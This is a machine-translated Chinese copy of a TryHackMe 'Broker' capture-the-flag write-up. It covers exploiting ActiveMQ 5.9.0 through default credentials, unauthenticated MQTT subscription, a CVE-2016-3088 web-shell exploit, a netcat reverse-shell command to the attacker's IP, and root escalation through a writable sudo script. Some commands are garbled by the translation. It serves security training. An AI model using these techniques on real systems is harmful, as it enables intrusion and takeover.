<html>
<head>
<title>Broker Tryhackme Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">经纪人Tryhackme报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/broker-tryhackme-writeup-f9cf3971e4da?source=collection_archive---------8-----------------------#2021-04-16">https://infosecwriteups.com/broker-tryhackme-writeup-f9cf3971e4da?source=collection_archive---------8-----------------------#2021-04-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c9c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">作者Shamsher khan这是一篇关于Tryhackme room“Broker”</strong>的文章</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/b68e38c517b1eb312d90d754fa1d4b36.png" data-original-src="https://miro.medium.com/v2/resize:fit:906/format:webp/1*r4_IE1ZEl7be6uipUA9-ig.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated"><a class="ae kx" href="https://www.tryhackme.com/room/broker" rel="noopener ugc nofollow" target="_blank">https://www.tryhackme.com/room/broker</a></figcaption></figure><p id="5229" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">房间链接:</strong><a class="ae kx" href="https://www.tryhackme.com/room/broker" rel="noopener ugc nofollow" target="_blank">https://www.tryhackme.com/room/broker</a><br/><strong class="jp ir">注:此房免费</strong></p><p id="aed3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">保罗和马克斯通过使用某种软件找到了一种在工作时聊天的方法。他们认为他们比老板聪明，但似乎不知道窃听是很可能的…他们最好小心..</p><p id="9b08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题1: </strong>对端口号大于1000小于10000的所有端口进行TCP端口扫描！您发现哪些TCP端口是开放的？(向上计数)</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ky"><img src="../Images/a1300c91ff2ecfc0df080f8f78f8b04d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1224/format:webp/1*_cgUSp9S1peQmR7ep2BqYQ.png"/></div></figure><blockquote class="kz la lb"><p id="ca57" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">答案:18838161</em></strong></p></blockquote><p id="bcb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">问题2: 他们使用的软件叫什么名字？</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lg"><img src="../Images/b7d89fe23c5bf1defe1fcee89ec9c45f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/1*onTK9cYIRYL8YI0FmdcY2Q.png"/></div></figure><blockquote class="kz la lb"><p id="db47" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">答案:ActiveMQ </em> </strong></p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi lh"><img src="../Images/ef99363adbfb55cf6dd89eb3279ff0bb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qPwvH6_BBkvMTpK-bQy8vg.png"/></div></div></figure><p id="2ac6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试了默认凭证，admin:admin为我们工作</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lm"><img src="../Images/c344f77f1c3a4f7507370da145d50bb2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*o7x05SrfOK-UYmfvzszLvA.png"/></div></figure><p id="b179" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意到一个版本号，即<strong class="jp ir"> 5.9.0 </strong></p><p id="c687" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">问题3: 保罗和马克斯在谈论哪个电子游戏？</p><p id="d54e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看上面的结果，一个端口作为MQTT服务器返回，另一个作为Jetty返回。MQTT协议提供了发布和订阅模型的轻量级方法。基本上是作为一个轻量级的消息协议。在我们的例子中，它启用了空身份验证，这意味着我们可以订阅任何发布的消息，而无需任何有效的凭据。我决定在后台订阅任何已发布的模型。</p><p id="9ab0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此时，很明显我们需要与运行在端口1883上的守护进程<code class="fe ln lo lp lq b">mqtt</code>对话(检查nmap扫描)。所以搜索一个<code class="fe ln lo lp lq b">mqtt</code>客户端找到了这个:</p><blockquote class="kz la lb"><p id="cf73" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated"><a class="ae kx" href="https://github.com/eclipse/paho.mqtt.python#getting-started" rel="noopener ugc nofollow" target="_blank"><em class="iq">https://github.com/eclipse/paho.mqtt.python#getting-started</em></a></p></blockquote><p id="bf0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">也发现这个链接非常有用:</p><blockquote class="kz la lb"><p id="c5aa" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated"><a class="ae kx" href="http://www.steves-internet-guide.com/into-mqtt-python-client/" rel="noopener ugc nofollow" target="_blank"><em class="iq">http://www . steves-internet-guide . com/into-mqtt-python-client/</em></a></p></blockquote><p id="cfc1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我们仍然需要一个“主题”让<code class="fe ln lo lp lq b">subscribe()</code>订阅主题和接收消息。这是在这里发现的:</p><blockquote class="kz la lb"><p id="1f08" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated"><a class="ae kx" href="http://10.10.120.228:8161/admin/xml/topics.jsp" rel="noopener ugc nofollow" target="_blank"><em class="iq">http://10 . 10 . 120 . 228:8161/admin/XML/topics . JSP</em></a></p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi lr"><img src="../Images/2dfef88eacfc4bfbf198e45820e12ddd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yhGPTuP9TCcRHSgvyX4WOQ.png"/></div></div></figure><p id="bfbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以编辑了来自GitHub链接的代码，并添加了主题、目标的IP地址和MQTT版本，它需要是3.1:</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="ls lt l"/></div></figure><pre class="km kn ko kp gt lu lq lv lw aw lx bi"><span id="14aa" class="ly lz iq lq b gy ma mb l mc md">pip install paho-mqtt</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi me"><img src="../Images/dc577654086f8f118b1a9781a1eee34f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mmFfaadc1bZbrhup7FNb3g.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mf"><img src="../Images/b281a543d8adfb617b8a37b938ea6569.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iHFz4kkLM_p0DKCZg32Erw.png"/></div></div></figure><blockquote class="kz la lb"><p id="ee80" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated"><strong class="jp ir">答案:黑客网</strong></p></blockquote><p id="91f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要利用这个版本的ActiveMQ中的一些漏洞来继续前进。Searchsploit发现了一个同样适用于5.9.0的漏洞。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mg"><img src="../Images/9b47beed09d83a477c5bbf6157554c00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lELAUfIoNao7d6RIlX76sA.png"/></div></div></figure><p id="679e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">出于某种原因，用于探索的Metasploit模块不工作，所以搜索任何可用的漏洞，并在GitHub上找到了这个:</p><blockquote class="kz la lb"><p id="8f91" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated">【https://github.com/gsheller/ActiveMQ_putshell-CVE-2016-3088 T4】</p></blockquote><p id="cd92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行起来非常简单:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/3156ca6ed23fc56b225157ac25f43388.png" data-original-src="https://miro.medium.com/v2/resize:fit:1296/format:webp/1*BWu4V3gdwdZbVSgns9fJYQ.png"/></div></figure><p id="3fb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">而这个在<a class="ae kx" href="http://10.10.120.228:8161/admin/guo.jsp" rel="noopener ugc nofollow" target="_blank"/>放了一个web shell，像<a class="ae kx" href="http://10.10.120.228:8161/admin/guo.jsp?pwd=gshell&amp;shell=whoami" rel="noopener ugc nofollow" target="_blank">http://</a><a class="ae kx" href="http://10.10.120.228:8161/admin/guo.jsp" rel="noopener ugc nofollow" target="_blank">broker . thm</a><a class="ae kx" href="http://10.10.120.228:8161/admin/guo.jsp?pwd=gshell&amp;shell=whoami" rel="noopener ugc nofollow" target="_blank">:8161/admin/Guo . JSP那样使用？pwd = g shell&amp;shell =</a>uname-a获取远程代码执行</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mi"><img src="../Images/07b71f4cc115663e621865f7d4beaa4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gNneNDajoHmDCLLTV2vKWQ.png"/></div></div></figure><h1 id="7e3b" class="mj lz iq bd mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bi translated">反向外壳</h1><p id="f19e" class="pw-post-body-paragraph jn jo iq jp b jq ng js jt ju nh jw jx jy ni ka kb kc nj ke kf kg nk ki kj kk ij bi translated">现在，为了获得一个反向的外壳，尝试了一些有效载荷，这个成功了，给了我们一个反向。注意:在执行反向shell有效负载URL之前，在攻击机器上启动netcat监听器，并使用您自己的IP地址替换IP地址:</p><p id="5194" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在netcat上启动监听器</p><pre class="km kn ko kp gt lu lq lv lw aw lx bi"><span id="7cdb" class="ly lz iq lq b gy ma mb l mc md">nc -lvp 4444</span></pre><blockquote class="kz la lb"><p id="d5c4" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated"><em class="iq">NC 10 . 2 . 12 . 26 4444-e/bin/sh</em></p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi nl"><img src="../Images/31017f1eeaa702df72e2f61889e2dbdc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ok2lmZYWM6HTQ6cioVQNNA.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/61fb422a48557b455373092e6586640a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1252/format:webp/1*RZ9jaNyQgdIzaQw7TRHrDA.png"/></div></figure><p id="e898" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">升级并稳定Shell <br/> </strong> <em class="lc">在目标上运行以下命令升级当前shell: </em></p><blockquote class="kz la lb"><p id="654f" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated"><em class="iq">script-QC/bin/bash/dev/null<br/>export TERM = xterm</em></p></blockquote><p id="e337" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> flag.txt </strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/d50d6ea6f97bcc771b200a64aa53a29d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1302/format:webp/1*FRh3_YlA19YwshIMjI730A.png"/></div></figure><h1 id="65be" class="mj lz iq bd mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bi translated">权限提升</h1><p id="9f91" class="pw-post-body-paragraph jn jo iq jp b jq ng js jt ju nh jw jx jy ni ka kb kc nj ke kf kg nk ki kj kk ij bi translated">运行<code class="fe ln lo lp lq b">sudo -l</code>表示我们可以运行<code class="fe ln lo lp lq b">/opt/apache-activemq-5.9.0</code>目录中的<code class="fe ln lo lp lq b">subcribe.py</code>。当前用户activemq对该文件也有写权限</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi no"><img src="../Images/e6021b1693571bb0d543305d7f0732ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rhMEIz1buPBffadzeTdBgA.png"/></div></div></figure><p id="1343" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我们可以通过使用nano在<code class="fe ln lo lp lq b">subcribe.py</code>中添加以下代码来轻松获得root，因为vi在目标上不可用:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi np"><img src="../Images/230aa6a1263ddca3f69d4c430f06afda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RMZoOZjgcXB3z1ZLPX_6XA.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi nq"><img src="../Images/d61a64e9a95ca25ab04eb83b85ae1206.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ajNVLM9XAMsbGopbawjT5w.png"/></div></div></figure><p id="adef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了<strong class="jp ir"> Root.txt </strong></p><p id="d9f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在:<br/><strong class="jp ir">LinkedIn:-</strong><a class="ae kx" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="jp ir">Twitter:-</strong><a class="ae kx" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="jp ir">Tryhackme:-</strong><a class="ae kx" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="0807" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">更多演练请继续关注… <br/>在您离开之前…</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><a href="https://t.me/tryhackme_writeups"><div class="gh gi ns"><img src="../Images/149e778f03405fe40fb89bb9dbc5034d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xbwPw7g3CVk4VUtK4VpR4g.png"/></div></a></figure><p id="09cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://t.me/tryhackme_writeups" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">点击此处加入电报</strong> </a></p><p id="da55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问我的其他演练:-</p><p id="a7af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您花时间阅读我的演练。<br/>如果你觉得有用，请点击👏按钮👏(高达40倍)并分享<br/>它来帮助其他有类似兴趣的人！+随时欢迎反馈！</p></div></div>    
</body>
</html>